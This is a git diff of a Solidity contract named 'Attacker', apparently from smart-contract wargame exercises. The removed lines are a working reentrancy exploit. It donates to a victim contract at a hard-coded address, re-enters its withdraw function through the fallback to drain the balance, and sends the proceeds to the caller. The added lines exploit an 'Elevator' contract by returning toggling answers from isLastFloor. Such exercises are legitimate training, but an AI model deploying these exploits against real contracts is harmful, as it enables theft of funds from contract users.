@@ -1,38 +1,33 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./reentrency.sol";
+import "./elevator.sol";
 import "hardhat/console.sol";
 
 contract Attacker{
-    Reentrance victimContract; //Contractname contractvariable
+    Elevator elevatorContract; //Contractname contractvariable
 
-    address payable victimAddress = 0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99; 
+    address elevatorAddress = 0x46c9090c18B02Df8bD1849EddF5a27A448a0c043; 
 
-    // // // import a contract
+    bool public toggle = true; 
+
+    // import a contract
     constructor() public {
-        victimContract = Reentrance(victimAddress);
+        elevatorContract = Elevator(elevatorAddress);
+    }
+    function isLastFloor(uint) external returns (bool){
+
+            if(!toggle){
+                toggle = true;
+                return toggle;
+            }
+
+        toggle = false;
+        return toggle;
     }
 
-     // Call this function first
-    function donateToVictim() public payable {
-        victimContract.donate{value: msg.value}(address(this));// Send a transaction with .001 eth
-    }
-
-    // call this funciton second
-    function attack() public {
-       if (address(victimContract).balance >= 0 ether){ // when this is called the contract should have .002 eth
-        victimContract.withdraw(.001 ether); 
-        }
-    }
-   
-    // call this funciton to claim all the money drained
-    function withdrawToCaller() public {
-        msg.sender.call{value: address(this).balance}("");
-    }
-
-     fallback() external payable {
-       attack();
+    function callGoTo() public {
+        elevatorContract.goTo(1);
     }
 
 }
